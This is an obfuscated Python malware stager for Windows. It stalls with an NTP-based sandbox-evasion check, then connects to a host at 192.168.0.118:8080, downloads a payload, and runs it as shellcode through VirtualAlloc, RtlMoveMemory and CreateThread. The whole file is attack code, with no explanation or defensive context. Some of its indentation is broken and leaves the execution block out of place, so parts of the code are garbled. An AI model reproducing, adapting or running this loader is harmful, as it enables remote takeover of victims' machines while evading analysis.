import struct, socket, binascii, ctypes as OKUKNcIJXOA, random, time
import multiprocessing
xYTzSiPqWOyckN = multiprocessing.cpu_count()
if xYTzSiPqWOyckN >= 1:
	from time import sleep
	from socket import AF_INET, SOCK_DGRAM
	import sys
	import datetime
	import time
	import socket
	import struct
	client = socket.socket(AF_INET, SOCK_DGRAM)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	EKlppuMIuMhFEpa = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
	sleep(5)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - EKlppuMIuMhFEpa).seconds >= 5):
		tlqBSXUO, ZTZhfpcYorz = None, None
		def msqrevgtyX():
			try:
				global ZTZhfpcYorz
				ZTZhfpcYorz = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				ZTZhfpcYorz.connect(('192.168.0.118', 8080))
				mSATBRvOnk = struct.pack('<i', ZTZhfpcYorz.fileno())
				l = struct.unpack('<i', ZTZhfpcYorz.recv(4))[0]
				wgbeXTJip = b"     "
				while len(wgbeXTJip) < l: wgbeXTJip += ZTZhfpcYorz.recv(l)
				VljEjHM = OKUKNcIJXOA.create_string_buffer(wgbeXTJip, len(wgbeXTJip))
				VljEjHM[0] = binascii.unhexlify('BF')
				for i in range(4): VljEjHM[i+1] = mSATBRvOnk[i]
				return VljEjHM
			except: return None
		def hcmgtsE(IeKruZd):
			if IeKruZd != None:
				jNlgxTQMh = bytearray(IeKruZd)
		nlVaRmnVM = OKUKNcIJXOA.windll.kernel32.VirtualAlloc(OKUKNcIJXOA.c_int(0),OKUKNcIJXOA.c_int(len(jNlgxTQMh)),OKUKNcIJXOA.c_int(0x3000),OKUKNcIJXOA.c_int(0x40))
		zSqYoELsxIXId = (OKUKNcIJXOA.c_char * len(jNlgxTQMh)).from_buffer(jNlgxTQMh)
		OKUKNcIJXOA.windll.kernel32.RtlMoveMemory(OKUKNcIJXOA.c_int(nlVaRmnVM), zSqYoELsxIXId, OKUKNcIJXOA.c_int(len(jNlgxTQMh)))
		ht = OKUKNcIJXOA.windll.kernel32.CreateThread(OKUKNcIJXOA.c_int(0),OKUKNcIJXOA.c_int(0),OKUKNcIJXOA.c_int(nlVaRmnVM),OKUKNcIJXOA.c_int(0),OKUKNcIJXOA.c_int(0),OKUKNcIJXOA.pointer(OKUKNcIJXOA.c_int(0)))
		OKUKNcIJXOA.windll.kernel32.WaitForSingleObject(OKUKNcIJXOA.c_int(ht),OKUKNcIJXOA.c_int(-1))
		tlqBSXUO = msqrevgtyX()
		hcmgtsE(tlqBSXUO)
